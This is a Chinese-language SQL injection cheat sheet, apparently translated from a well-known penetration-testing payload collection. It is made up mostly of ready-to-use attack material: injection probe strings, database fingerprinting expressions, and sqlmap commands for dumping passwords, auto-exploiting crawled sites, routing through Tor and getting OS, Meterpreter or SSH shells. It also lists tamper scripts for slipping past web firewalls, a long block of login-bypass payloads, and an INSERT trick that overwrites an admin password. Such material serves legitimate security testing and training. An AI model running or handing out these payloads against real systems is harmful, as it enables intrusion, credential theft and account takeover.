# SQL注入攻击

> SQL注入攻击包括通过客户端输入数据向应用程序中插入或“注入”SQL查询。

尝试操纵SQL查询的目的可能包括：

- 信息泄露
- 泄露存储的数据
- 操纵存储的数据
- 绕过授权控制

## 概述

* [备忘单](#cheatsheets)
  * [MSSQL注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
  * [MySQL注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
  * [OracleSQL注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
  * [PostgreSQL注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
  * [SQLite注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
  * [Cassandra注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
  * [HQL注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)
  * [DB2注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
* [入口点检测](#entry-point-detection)
* [DBMS识别](#dbms-identification)
* [使用SQLmap进行SQL注入](#sql-injection-using-sqlmap)
  * [SQLmap的基本参数](#basic-arguments-for-sqlmap)
  * [加载请求文件并使用移动用户代理](#load-a-request-file-and-use-mobile-user-agent)
  * [在UserAgent/Header/Referer/Cookie中进行自定义注入](#custom-injection-in-useragentheaderreferercookie)
  * [二阶注入](#second-order-injection)
  * [Shell](#shell)
  * [使用SQLmap爬取网站并自动利用](#crawl-a-website-with-sqlmap-and-auto-exploit)
  * [配合TOR使用SQLmap](#using-tor-with-sqlmap)
  * [配合代理使用SQLmap](#using-a-proxy-with-sqlmap)
  * [使用Chrome cookie和代理](#using-chrome-cookie-and-a-proxy)
  * [使用后缀篡改注入](#using-suffix-to-tamper-the-injection)
  * [通用篡改选项和篡改列表](#general-tamper-option-and-tampers-list)
  * [不使用SQL注入的SQLmap](#sqlmap-without-sql-injection)
* [认证绕过](#authentication-bypass)
  * [原始MD5 SHA1认证绕过](#authentication-bypass-raw-md5-sha1)
* [多上下文注入](#polyglot-injection-multicontext)
* [路由注入](#routed-injection)
* [插入语句 - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
* [通用WAF绕过](#generic-waf-bypass)
  * [空格替代方案](#white-spaces-alternatives)
  * [不允许逗号](#no-comma-allowed)
  * [不允许等号](#no-equal-allowed)
  * [大小写修改](#case-modification)


## 入口点检测

检测SQL注入入口点

* **错误信息**：在输入字段中输入特殊字符（例如，单引号 '）可能会触发SQL错误。如果应用程序显示详细的错误信息，它可能表明潜在的SQL注入点。

  * 简单字符

    ```sql
    '
    %27
    "
    %22
    #
    %23
    ;
    %3B
    )
    通配符 (*)
    &apos;  # 用于XML内容
    ```

  * 多重编码

    ```sql
    %%2727
    %25%27
    ```

  * Unicode字符

    ```
    Unicode字符U+02BA MODIFIER LETTER DOUBLE PRIME（编码为%CA%BA）转换为U+0022 QUOTATION MARK（"）
    Unicode字符U+02B9 MODIFIER LETTER PRIME（编码为%CA%B9）转换为U+0027 APOSTROPHE（'）
    ```

* **基于重言式的SQL注入**：通过输入总是为真的条件（重言式），您可以测试漏洞。例如，在用户名字段中输入`admin' OR '1'='1`，如果系统易受攻击，您可能会以管理员身份登录。

  * 合并字符

    ```sql
    `+HERP
    '||'DERP
    '+'herp
    ' 'DERP
    '%20'HERP
    '%2B'HERP
    ```

  * 逻辑测试

    ```sql
    page.asp?id=1 or 1=1 -- 为真
    page.asp?id=1' or 1=1 -- 为真
    page.asp?id=1" or 1=1 -- 为真
    page.asp?id=1 and 1=2 -- 为假
    ```

* **计时攻击**：输入导致故意延迟的SQL命令（例如，在MySQL中使用`SLEEP`或`BENCHMARK`函数）可以帮助识别潜在的注入点。如果应用程序在此类输入后响应异常缓慢，则可能易受攻击。



## 数据库类型识别

```c
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

# 使用SQLmap进行SQL注入

[sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) 是一个开源的渗透测试工具，它自动化了检测和利用SQL注入漏洞以及接管数据库服务器的过程。

### SQLmap的基本参数

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### 加载请求文件并使用移动用户代理

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### 在UserAgent/Header/Referer/Cookie中自定义注入

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
注入位于'*'处
```

### 二次注入

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`

### 使用SQLmap爬取网站并自动利用

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = 非交互模式，通常Sqlmap会问你问题，这个接受默认答案
--crawl = 你想爬取站点的深度
--forms = 解析并测试表单
```

### 使用TOR与SQLmap

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### 使用代理与SQLmap

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### 使用Chrome cookie和代理

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### 使用后缀篡改注入

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### 通用tamper选项和tamper列表

```powershell
tamper=name_of_the_tamper
```

| tamper脚本                   | 描述                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| 0x2char.py                   | 将每个（MySQL）0x<十六进制>编码的字符串替换为等效的CONCAT(CHAR(),...)对应项 |
| apostrophemask.py            | 用其UTF-8全角对应项替换撇号字符                              |
| apostrophenullencode.py      | 用其非法双Unicode对应项替换撇号字符                          |
| appendnullbyte.py            | 在有效载荷末尾追加编码的空字节字符                           |
| base64encode.py              | 对给定有效载荷中的所有字符进行Base64编码                     |
| between.py                   | 将大于操作符 ('>') 替换为 'NOT BETWEEN 0 AND #'              |
| bluecoat.py                  | 在SQL语句后的空格字符后替换为一个有效的随机空白字符。之后将字符=替换为LIKE操作符 |
| chardoubleencode.py          | 对给定有效载荷中的所有字符进行双重URL编码（不处理已编码的）  |
| charencode.py                | 对给定有效载荷中的所有字符进行URL编码（不处理已编码的）（例如 SELECT -> %53%45%4C%45%43%54） |
| charunicodeencode.py         | 对给定有效载荷中的所有字符进行Unicode-URL编码（不处理已编码的）（例如 SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054） |
| charunicodeescape.py         | 对给定有效载荷中未编码的字符进行Unicode转义（不处理已编码的）（例如 SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054） |
| commalesslimit.py            | 将类似 'LIMIT M, N' 的实例替换为 'LIMIT N OFFSET M'          |
| commalessmid.py              | 将类似 'MID(A, B, C)' 的实例替换为 'MID(A FROM B FOR C)'     |
| commentbeforeparentheses.py  | 在括号前添加（内联）注释（例如 ( -> /**/()                   |
| concat2concatws.py           | 将类似 'CONCAT(A, B)' 的实例替换为 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' |
| charencode.py                | 对给定有效载荷中的所有字符进行URL编码（不处理已编码的）      |
| charunicodeencode.py         | 对给定有效载荷中未编码的字符进行Unicode-URL编码（不处理已编码的） |
| equaltolike.py               | 将所有出现的等号操作符 ('=') 替换为 'LIKE' 操作符            |
| escapequotes.py              | 斜杠转义引号（' 和 "）                                       |
| greatest.py                  | 将大于操作符 ('>') 替换为 'GREATEST' 对应项                  |
| halfversionedmorekeywords.py | 在每个关键字前添加带版本的MySQL注释                          |
| htmlencode.py                | 使用代码点对所有非字母数字字符进行HTML编码（例如 ‘ -> &#39;） |
| ifnull2casewhenisnull.py     | 将类似 ‘IFNULL(A, B)’ 的实例替换为 ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ 对应项 |
| ifnull2ifisnull.py           | 将类似 'IFNULL(A, B)' 的实例替换为 'IF(ISNULL(A), B, A)'     |
| informationschemacomment.py  | 在所有出现的（MySQL）“information_schema”标识符末尾添加内联注释（/**/） |
| least.py                     | 将大于操作符 (‘>’) 替换为 ‘LEAST’ 对应项                     |
| lowercase.py                 | 将每个关键字字符替换为小写值（例如 SELECT -> select）        |
| modsecurityversioned.py      | 用带版本的注释包围完整查询                                   |
| modsecurityzeroversioned.py  | 用零版本注释包围完整查询                                     |
| multiplespaces.py            | 在SQL关键字周围添加多个空格                                  |
| nonrecursivereplacement.py   | 将预定义的SQL关键字替换为适合替换的表示（例如 .replace("SELECT", "") 过滤器） |
| overlongutf8.py              | 将给定有效载荷中的所有字符转换为超长UTF8（不处理已编码的）   |
| overlongutf8more.py          | 将给定有效载荷中的所有字符转换为超长UTF8（不处理已编码的）（例如 SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94） |
| percentage.py                | 在每个字符前添加百分号（%）                                  |
| plus2concat.py               | 将加号操作符 (‘+’) 替换为（MsSQL）函数 CONCAT() 对应项       |
| plus2fnconcat.py             | 将加号操作符 (‘+’) 替换为（MsSQL）ODBC函数 {fn CONCAT()} 对应项 |
| randomcase.py                | 将每个关键字字符替换为随机大小写值                           |
| randomcomments.py            | 向SQL关键字添加随机评论                                      |
| securesphere.py              | 追加精心制作的特殊字符串                                     |
| sp_password.py               | 在有效载荷末尾追加 'sp_password' 以自动从DBMS日志中混淆      |
| space2comment.py             | 用注释替换空格字符（' '）                                    |
| space2dash.py                | 用破折号注释（'--'）后跟随机字符串和新行（''）替换空格字符（' '） |
|                              |                                                              |
| space2hash.py                | 用井号字符（'#'）后跟随机字符串和新行（''）替换空格字符（' '） |
|                              |                                                              |
| space2morehash.py            | 用井号字符（'#'）后跟随机字符串和新行（''）替换空格字符（' '） |
|                              |                                                              |
| space2mssqlblank.py          | 用来自有效备选字符集的随机空白字符替换空格字符（' '）        |
| space2mssqlhash.py           | 用井号字符（'#'）后跟新行（''）替换空格字符（' '）           |
|                              |                                                              |
| space2mysqlblank.py          | 用来自有效备选字符集的随机空白字符替换空格字符（' '）        |
| space2mysqldash.py           | 用破折号注释（'--'）后跟新行（''）替换空格字符（' '）        |
|                              |                                                              |
| space2plus.py                | 用加号（'+'）替换空格字符（' '）                             |
| space2randomblank.py         | 用来自有效备选字符集的随机空白字符替换空格字符（' '）        |
| symboliclogical.py           | 用它们的符号对应项（&& 和                                    |
| unionalltounion.py           | 用UNION SELECT替换UNION ALL SELECT                           |
| unmagicquotes.py             | 用多字节组合%bf%27替换引号字符（'），并在末尾附加通用注释（使其工作） |
| uppercase.py                 | 将每个关键字字符替换为大写值                                 |
| varnish.py                   | 追加HTTP头 'X-originating-IP'                                |
| versionedkeywords.py         | 用带版本的MySQL注释括起来每个非函数关键字                    |
| versionedmorekeywords.py     | 用带版本的MySQL注释括起来每个关键字                          |
| xforwardedfor.py             | 追加伪造的HTTP头 'X-Forwarded-For'                           |

### 不使用SQL注入的SQLmap

您可以使用SQLmap通过其端口而不是URL访问数据库。

```ps1
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
```

## 认证绕过

```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## 认证绕过（原始MD5和SHA1）

当使用原始md5时，密码将作为简单字符串查询，而不是十六进制字符串。

```php
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

允许攻击者构造一个带有`true`语句的字符串，例如`' or 'SOMETHING`

```php
md5("ffifdyop", true) = 'or'6!rb
sha1("3fDf ", true) = Qu'='t o_-!
```

挑战演示可在 [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

## 多上下文注入（Polyglot injection）

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* 仅MySQL */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

## 路由注入

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

## 插入语句 - ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE关键字用于告诉MySQL当应用程序尝试插入表中已存在的行时该怎么做。我们可以利用这一点通过以下方式更改管理员密码：

```sql
使用有效载荷注入：
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

查询将如下所示：
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

此查询将为用户“attacker_dummy@example.com”插入一行。它还将为用户“admin@example.com”插入一行。
因为此行已经存在，ON DUPLICATE KEY UPDATE关键字告诉MySQL将已存在的行的`password`列更新为"bcrypt_hash_of_qwerty"。

之后，我们可以简单地使用“admin@example.com”和密码“qwerty”进行身份验证！
```



## 通用WAF绕过方法

### 空格替代方案

* 不允许空格（`%20`）- 使用空格替代方案绕过

  ```sql
  ?id=1%09and%091=1%09--
  ?id=1%0Dand%0D1=1%0D--
  ?id=1%0Cand%0C1=1%0C--
  ?id=1%0Band%0B1=1%0B--
  ?id=1%0Aand%0A1=1%0A--
  ?id=1%A0and%A01=1%A0--
  ```

* 无空格 - 使用注释绕过

  ```sql
  ?id=1/*comment*/and/**/1=1/**/--
  ```

* 无空格 - 使用括号绕过

  ```sql
  ?id=(1)and(1)=(1)--
  ```

* 不同数据库管理系统（DBMS）的空格替代方案

  ```sql
  -- 示例查询，其中空格被替换为ASCII码高于0x80的字符
  ♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
  ```

| DBMS       | 十六进制中的ASCII字符                                        |
| ---------- | ------------------------------------------------------------ |
| SQLite3    | 0A, 0D, 0C, 09, 20                                           |
| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                                   |
| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20                                           |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                                       |
| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |

### 不允许逗号

使用OFFSET、FROM和JOIN绕过

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### 不允许等号

使用LIKE/NOT IN/IN/BETWEEN绕过

```sql
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```

### 大小写修改

* 使用大写/小写绕过（参见关键字AND）

  ```sql
  ?id=1 AND 1=1#
  ?id=1 AnD 1=1#
  ?id=1 aNd 1=1#
  ```

* 使用大小写不敏感的关键字/使用等价操作符绕过

  ```sql
  AND   -> &&
  OR    -> ||
  =     -> LIKE,REGEXP, BETWEEN, not < and not >
  > X   -> not between 0 and X
  WHERE -> HAVING
  ```

## 实验室

* [SQL注入漏洞位于WHERE子句，允许检索隐藏数据](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* [SQL注入漏洞允许登录绕过](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* [通过XML编码绕过过滤的SQL注入](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [SQL实验室](https://portswigger.net/web-security/all-labs#sql-injection)

## 参考资料

* 检测SQLi
  * [手动SQL注入发现技巧](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
  * [NetSPI SQL注入维基](https://sqlwiki.netspi.com/)

* MySQL:
  * [PentestMonkey的MySQL注入攻击技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
  * [Reiners的MySQL注入过滤规避技巧表](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
  * [MySQL中Information_Schema.Tables的替代方案](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
  * [SQL注入知识库](https://websec.ca/kb/sql_injection)
* MSSQL:
  * [EvilSQL的错误/联合/盲注MSSQL技巧表](http://evilsql.com/main/page2.php)
  * [PentestMonkey的MSSQL SQLi注入攻击技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* ORACLE:
  * [PentestMonkey的Oracle SQLi技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
* POSTGRESQL:
  * [PentestMonkey的Postgres SQLi技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* 其他
  * [NetSparker的SQLi技巧表](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
  * [Access SQLi技巧表](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
  * [PentestMonkey的Ingres SQL注入攻击技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
  * [PentestMonkey的DB2 SQL注入攻击技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
  * [PentestMonkey的Informix SQL注入攻击技巧表](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
  * [SQLite3注入攻击技巧表](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
  * [Ruby on Rails (Active Record) SQL注入攻击指南](http://rails-sqli.org/)
